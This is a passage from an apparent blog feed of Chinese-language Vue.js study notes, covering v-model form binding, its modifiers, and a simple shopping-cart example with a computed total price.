class="hljs-name">textarea</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Content1:&#123;&#123; text &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <br>       <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>汉语即时显示<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> @<span class="hljs-attr">input</span>=<span class="hljs-string">&quot;handleInput&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;输入2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Content1:&#123;&#123; text1 &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>单选框<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 单选框 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;picked&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;HTML&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;html&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;html&quot;</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;picked&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;JS&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;js&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;html&quot;</span>&gt;</span>JavaScript<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;picked&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;CSS&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;css&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;html&quot;</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;padding-left: 30px;&quot;</span>&gt;</span>Picked:&#123;&#123; picked &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- 复选框 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>复选框<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;checked&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checked&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;CSS&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;css&quot;</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;checked&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checked&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;JS&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span>JS<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;checked&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;checked&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;HTML&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;html&quot;</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;checked&quot;</span>&gt;</span>已选：&#123;&#123; checked &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>下拉框(单选)<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;selected&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>JS<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;selected&quot;</span>&gt;</span>已选：&#123;&#123; selected &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>下拉框(多选)<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;selected1&quot;</span> <span class="hljs-attr">multiple</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>JS<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;selected1&quot;</span>&gt;</span>已选：&#123;&#123; selected1 &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> app=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">text</span>:<span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">text1</span>:<span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">picked</span>:<span class="hljs-string">&#x27;false&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">checked</span>:[<span class="hljs-string">&#x27;&#x27;</span>],</span><br><span class="language-javascript">                <span class="hljs-attr">selected</span>:<span class="hljs-string">&#x27;&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">selected1</span>:[<span class="hljs-string">&#x27;&#x27;</span>]</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">computed</span>:&#123;</span><br><span class="language-javascript"></span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">methods</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">handleInput</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">text1</span>=e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>;</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="6-2-绑定值"><a href="#6-2-绑定值" class="headerlink" title="6.2 绑定值"></a>6.2 绑定值</h3><p>选中显示a,未选中显示b</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>复选框：<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;picked2&quot;</span> <span class="hljs-attr">:true-value</span>=<span class="hljs-string">&quot;value1&quot;</span> <span class="hljs-attr">:false-value</span>=<span class="hljs-string">&quot;value2&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>复选框：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;&#123; picked2 &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Value1:&#123;&#123; value1 &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Value2:&#123;&#123; value2 &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="6-3-修饰符"><a href="#6-3-修饰符" class="headerlink" title="6.3 修饰符"></a>6.3 修饰符</h3><p>​    1 v-model.lazy 显示数据不是实时改变，回车或者失焦才会改变；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>.lazy<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model.lazy</span>=<span class="hljs-string">&quot;lazy&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Lazy:&#123;&#123; lazy &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​    2 v-model.number 将输入类型转换为Number类型，否则虽然输入的是数字，其实类型是字符串；若是输入字符，不显示；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>.numebr<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model.number</span>=<span class="hljs-string">&quot;number&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>number:&#123;&#123; number &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​    3 v-model.trim 去除首尾空白；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>.trim<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model.trim</span>=<span class="hljs-string">&quot;trim&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>trim:&#123;&#123; trim &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
      <tag>Vue.js实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue购物车</title>
    <link href="/2020/11/20/Vue_Shopping_Car/"/>
    <url>/2020/11/20/Vue_Shopping_Car/</url>
    
    <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs html">//一个购物车实例<br>//重点在数据的绑定和computed属性，methods方法在后面的章节<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">table</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-tag">th</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-tag">td</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;</span><br><span class="language-css">        &#125;</span><br><span class="language-css"></span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span> <span class="hljs-attr">v-cloak</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;list.length&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Price<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Count<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Option<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(item,index) in list&quot;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; index+1 &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; item.name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; item.price &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;handleReduce(index)&quot;</span> <span class="hljs-attr">:disabled</span>=<span class="hljs-string">&quot;item.count === 1&quot;</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>                            &#123;&#123; item.count &#125;&#125;<br>                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;handleAdd(index)&quot;</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;handleRemove(index)&quot;</span>&gt;</span>移除<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>总价：¥ &#123;&#123; total &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-else</span>&gt;</span>购物车竟然是空的，快来添加心仪的商品！<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#app&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">list</span>: [</span><br><span class="language-javascript">                    &#123;</span><br><span class="language-javascript">                        <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;iPhone&#x27;</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">price</span>: <span class="hljs-number">9998</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">count</span>: <span class="hljs-number">1</span>,</span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                    &#123;</span><br><span class="language-javascript">                        <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;iPad&#x27;</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">price</span>: <span class="hljs-number">3988</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">count</span>: <span class="hljs-number">1</span>,</span><br><span class="language-javascript">                    &#125;,</span><br><span class="language-javascript">                    &#123;</span><br><span class="language-javascript">                        <span class="hljs-attr">id</span>: <span class="hljs-number">3</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;iWatch&#x27;</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">price</span>: <span class="hljs-number">2599</span>,</span><br><span class="language-javascript">                        <span class="hljs-attr">count</span>: <span class="hljs-number">1</span>,</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                ]</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">handleAdd</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">index</span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>[index].<span class="hljs-property">count</span>++;</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">handleReduce</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">index</span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>[index].<span class="hljs-property">count</span> === <span class="hljs-number">1</span>) &#123;</span><br><span class="language-javascript">                        <span class="hljs-keyword">return</span>;</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                    <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                        <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>[index].<span class="hljs-property">count</span>--;</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                &#125;,</span><br><span class="language-javascript">                <span class="hljs-attr">handleRemove</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">index</span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>);</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">computed</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">total</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">                    <span class="hljs-keyword">var</span> total = <span class="hljs-number">0</span>;</span><br><span class="language-javascript">                    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>.<span class="hljs-property">length</span>; i++) &#123;</span><br><span class="language-javascript">                        <span class="hljs-keyword">var</span> item = <span class="hljs-variable language_">this</span>.<span class="hljs-property">list</span>[i];</span><br><span class="language-javascript">                        total += item.<span class="hljs-property">price</span> * item.<span class="hljs-property">count</span>;</span><br><span class="language-javascript">                    &#125;</span><br><span class="language-javascript">                    <span class="hljs-keyword">return</span> total.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\B(?=(\d&#123;3&#125;)+$)/g</span>, <span class="hljs-string">&#x27;,&#x27;</span>);</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../Nowebpack/js/shopping_car.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
      <tag>Vue.js实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
